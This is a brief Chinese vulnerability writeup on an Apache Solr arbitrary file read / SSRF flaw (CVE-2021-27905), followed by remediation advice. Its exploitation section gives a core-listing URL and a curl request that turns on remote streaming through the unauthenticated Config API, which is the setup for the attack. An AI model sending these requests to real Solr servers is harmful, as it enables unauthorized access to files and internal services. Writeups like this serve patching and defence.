### 一 漏洞描述
solr任意文件读取(CVE-2021-27905)

在Apache Solr未开启认证的情况下，攻击者可直接构造特定请求开启特定配置，并最终造成SSRF或任意文件读取。

Apache Solr <= 8.8.1

### 二 漏洞利用
step1:  
http://192.168.31.96:8983/solr/admin/cores?indexInfo=false&wt=json
获取 core

step2:  
```angular2html
curl -i -s -k -X $'POST' \
    -H $'Content-Type: application/json' --data-binary $'{\"set-property\":{\"requestDispatcher.requestParsers.enableRemoteStreaming\":true}}' \
    $'http://192.168.31.96:8983/solr/demo/config'
```

### 三 漏洞修复
1 关闭ConfigAPI：在bin目录下的solr.in.cmd中加入一行set SOLR_OPTS=%SOLR_OPTS% -Ddisable.configEdit=true；然后关闭远程读取文件流，默认不开启
2 增加访问控制口令
